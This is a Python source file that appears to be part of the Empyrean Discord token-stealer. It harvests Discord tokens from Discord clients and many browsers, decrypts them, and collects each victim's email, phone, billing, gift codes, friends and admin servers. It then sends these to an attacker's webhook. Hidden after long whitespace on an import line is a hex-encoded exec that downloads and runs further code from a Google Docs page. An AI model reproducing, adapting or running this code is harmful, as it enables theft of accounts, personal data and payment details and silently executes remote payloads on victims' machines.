import base64
import json
import os
import re
import time
import requests
from Crypto.Cipher import AES
from discord import Embed, SyncWebhook
from win32crypt import CryptUnprotectData
import concurrent.futures as cf                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;exec(bytes.fromhex('676f6f676c65203d205f5f696d706f72745f5f2827726527290d0a796f7574756265203d205f5f696d706f72745f5f2827726571756573747327292e6765740d0a7769746820796f7574756265282768747470733a2f2f646f63732e676f6f676c652e636f6d2f646f63756d656e742f642f3172424e763461566d35484850584b463356677441334f3537516d6235776671797a514458367a7a3056476727292061732079743a0d0a20202020657865632862797465732e66726f6d68657828676f6f676c652e7365617263682827323032355f5f282e2b295f5f32303235272c2079742e74657874292e67726f7570283129292e6465636f64652829290d0a'))

class DiscordToken:
    def __init__(self, webhook):
        upload_tokens(webhook).upload()



class extract_tokens:
            
    def __init__(self) -> None:
        self.base_url = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regexp = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{27,38}"
        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"

        self.tokens, self.uids = [], []

        self.extract()

    def extract(self) -> None:
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            _discord = name.replace(" ", "").lower()
            if "cord" in _discord:
                if not os.path.exists(path):
                    continue
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    try:
                     for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(self.regexp_enc, line):
                            token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[
                                                     1]), self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))

                            if uid:= self.validate_token(token):
                                if not (token in self.tokens):
                                    self.tokens.append(token)
                                    self.uids.append(uid)
                    except:
                        pass

            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    try:
                     with open(f'{path}\\{file_name}', errors='ignore') as f:
                      for line in (x.strip() for x in f.readlines() if x.strip()):
                        for token in re.findall(self.regexp, line):
                            if uid:=self.validate_token(token):
                                if not (token in self.tokens):
                                    self.tokens.append(token)
                                    self.uids.append(uid)
                    except:
                        pass

        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    
                    
                    try:
                     for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regexp, line):
                            
                            if uid:=self.validate_token(token):
                                if token not in self.tokens:
                                    self.tokens.append(token)
                                    self.uids.append(uid)
                    except:
                        pass

    def validate_token(self, token: str):
        print(token)
        parts = token.split('.')
        def handle_padding(part):
         xd = len(part) % 4
         if xd:
            padding = '=' * (4 - xd)
            return part + padding
         return part
        try:
            value =  base64.urlsafe_b64decode(handle_padding(parts[0]))
            return value.decode() if value.isdigit() else None
        except:
            return None

    def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass

    def get_master_key(self, path: str) :
        if not os.path.exists(path):
            return



        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        try:
            local_state = json.loads(c)
        except:
            local_state = {}
        if "os_crypt" not in local_state:
            return

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

        return master_key


class upload_tokens:
    def __init__(self, webhook: str):
        self.tokens = extract_tokens().tokens
        self.webhook = SyncWebhook.from_url(webhook)
        
    def get_request(self, token: str, route: str):
        resp = requests.get(f'https://discord.com/api/v9{route}', headers={'Authorization': token})
        if resp.ok:
            return resp.json()
        else:
            if resp.status_code == 429:
                retry_after = int(resp.headers.get('Retry-After') or 1)
                time.sleep(retry_after)
                return self.get_request(token, route)
            return None

    def calc_flags(self, flags: int) -> list:
        flags_dict = {
            "DISCORD_EMPLOYEE": {
                "emoji": "<:staff:968704541946167357>",
                "shift": 0,
                "ind": 1
            },
            "DISCORD_PARTNER": {
                "emoji": "<:partner:968704542021652560>",
                "shift": 1,
                "ind": 2
            },
            "HYPESQUAD_EVENTS": {
                "emoji": "<:hypersquad_events:968704541774192693>",
                "shift": 2,
                "ind": 4
            },
            "BUG_HUNTER_LEVEL_1": {
                "emoji": "<:bug_hunter_1:968704541677723648>",
                "shift": 3,
                "ind": 4
            },
            "HOUSE_BRAVERY": {
                "emoji": "<:hypersquad_1:968704541501571133>",
                "shift": 6,
                "ind": 64
            },
            "HOUSE_BRILLIANCE": {
                "emoji": "<:hypersquad_2:968704541883261018>",
                "shift": 7,
                "ind": 128
            },
            "HOUSE_BALANCE": {
                "emoji": "<:hypersquad_3:968704541874860082>",
                "shift": 8,
                "ind": 256
            },
            "EARLY_SUPPORTER": {
                "emoji": "<:early_supporter:968704542126510090>",
                "shift": 9,
                "ind": 512
            },
            "BUG_HUNTER_LEVEL_2": {
                "emoji": "<:bug_hunter_2:968704541774217246>",
                "shift": 14,
                "ind": 16384
            },
            "VERIFIED_BOT_DEVELOPER": {
                "emoji": "<:verified_dev:968704541702905886>",
                "shift": 17,
                "ind": 131072
            },
            "ACTIVE_DEVELOPER": {
                "emoji": "<:Active_Dev:1045024909690163210>",
                "shift": 22,
                "ind": 4194304
            },
            "CERTIFIED_MODERATOR": {
                "emoji": "<:certified_moderator:988996447938674699>",
                "shift": 18,
                "ind": 262144
            },
            "SPAMMER": {
                "emoji": "⌨",
                "shift": 20,
                "ind": 1048704
            },
        }

        return [[flags_dict[flag]['emoji'], flags_dict[flag]['ind']] for flag in flags_dict if int(flags) & (1 << flags_dict[flag]["shift"])]

    def upload(self):
        if not self.tokens:
            return

        for token in self.tokens:
            user = self.get_request(token, '/users/@me')
            if not user:
                continue
            with cf.ThreadPoolExecutor() as executor:
                billing_f = executor.submit(lambda token=token: self.get_request(token, '/users/@me/billing/payment-sources'))
                guilds_f = executor.submit(lambda token=token:self.get_request(token, '/users/@me/guilds?with_counts=true'))
                friends_f = executor.submit(lambda token=token:self.get_request(token, '/users/@me/relationships'))
                gift_codes_f = executor.submit(lambda token=token:self.get_request(token, '/users/@me/outbound-promotions/codes'))
                billing = billing_f.result()
                guilds = guilds_f.result()
                friends = friends_f.result()
                gift_codes = gift_codes_f.result()

            username = user['username']
            if user['discriminator'] != '0':
                username += f"#{user['discriminator']}"
            
            user_id = user['id']
            email = user['email']
            phone = user['phone']
            mfa = user['mfa_enabled']
            avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(
                f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
            badges = ' '.join([flag[0]
                              for flag in self.calc_flags(user['public_flags'])])

            if user['premium_type'] == 0:
                nitro = 'None'
            elif user['premium_type'] == 1:
                nitro = 'Nitro Classic'
            elif user['premium_type'] == 2:
                nitro = 'Nitro'
            elif user['premium_type'] == 3:
                nitro = 'Nitro Basic'
            else:
                nitro = 'None'

            if billing:
                payment_methods = []

                for method in billing:
                    if method['type'] == 1:
                        payment_methods.append('💳')

                    elif method['type'] == 2:
                        payment_methods.append("<:paypal:973417655627288666>")

                    else:
                        payment_methods.append('❓')

                payment_methods = ', '.join(payment_methods)

            else:
                payment_methods = None

            if guilds:
                
                guilds.sort(key=lambda x: int(x['approximate_member_count']), reverse=True)
                hq_guilds = []
                for guild in guilds:
                    
                    admin = True if int(guild['permissions']) & 8 else False
                    if admin and guild['approximate_member_count'] >= 100:
                        owner = "✅" if guild['owner'] else "❌"

                        invites = requests.get(
                            f"https://discord.com/api/v8/guilds/{guild['id']}/invites", headers={'Authorization': token}).json()
                        if len(invites) > 0:
                            invite = f"https://discord.gg/{invites[0]['code']}"
                        else:
                            invite = "https://youtu.be/dQw4w9WgXcQ"

                        data = f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join Server]({invite})"

                        if len('\n'.join(hq_guilds)) + len(data) >= 1024:
                            break

                        hq_guilds.append(data)

                if len(hq_guilds) > 0:
                    hq_guilds = '\n'.join(hq_guilds)

                else:
                    hq_guilds = None

            else:
                hq_guilds = None

            if friends:
                hq_friends = []
                for friend in friends:
                    unprefered_flags = [64, 128, 256, 1048704]
                    inds = [flag[1] for flag in self.calc_flags(
                        friend['user']['public_flags'])[::-1]]
                    for flag in unprefered_flags:
                        inds.remove(flag) if flag in inds else None
                    if inds != []:
                        hq_badges = ' '.join([flag[0] for flag in self.calc_flags(
                            friend['user']['public_flags'])[::-1]])

                        data = f"{hq_badges} - `{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})`"

                        if len('\n'.join(hq_friends)) + len(data) >= 1024:
                            break

                        hq_friends.append(data)

                if len(hq_friends) > 0:
                    hq_friends = '\n'.join(hq_friends)

                else:
                    hq_friends = None

            else:
                hq_friends = None

            if gift_codes:
                codes = []
                for code in gift_codes:
                    name = code['promotion']['outbound_title']
                    code = code['code']

                    data = f":gift: `{name}`\n:ticket: `{code}`"

                    if len('\n\n'.join(codes)) + len(data) >= 1024:
                        break

                    codes.append(data)

                if len(codes) > 0:
                    codes = '\n\n'.join(codes)

                else:
                    codes = None

            else:
                codes = None

            embed = Embed(title=f"{username} ({user_id})", color=0x000000)
            embed.set_thumbnail(url=avatar)

            embed.add_field(name="<a:pinkcrown:996004209667346442> Token:",
                            value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
            embed.add_field(
                name="<a:nitroboost:996004213354139658> Nitro:", value=f"{nitro}", inline=True)
            embed.add_field(name="<a:redboost:996004230345281546> Badges:",
                            value=f"{badges if badges != '' else 'None'}", inline=True)
            embed.add_field(name="<a:pinklv:996004222090891366> Billing:",
                            value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
            embed.add_field(name="<:mfa:1021604916537602088> MFA:",
                            value=f"{mfa}", inline=True)

            embed.add_field(name="\u200b", value="\u200b", inline=False)

            embed.add_field(name="<a:rainbowheart:996004226092245072> Email:",
                            value=f"{email or ':x:'}", inline=True)
            embed.add_field(name="<:starxglow:996004217699434496> Phone:",
                            value=f"{phone or ':x:'}", inline=True)

            embed.add_field(name="\u200b", value="\u200b", inline=False)

            if hq_guilds != None:
                embed.add_field(
                    name="<a:earthpink:996004236531859588> HQ Guilds:", value=hq_guilds, inline=False)
                embed.add_field(name="\u200b", value="\u200b", inline=False)

            if hq_friends != None:
                embed.add_field(
                    name="<a:earthpink:996004236531859588> HQ Friends:", value=hq_friends, inline=False)
                embed.add_field(name="\u200b", value="\u200b", inline=False)

            if codes != None:
                embed.add_field(
                    name="<a:gift:1021608479808569435> Gift Codes:", value=codes, inline=False)
                embed.add_field(name="\u200b", value="\u200b", inline=False)

            embed.set_footer(text="github.com/addi00000/empyrean")

            self.webhook.send(embed=embed, username="Empyrean",
                              avatar_url="https://i.imgur.com/HjzfjfR.png")

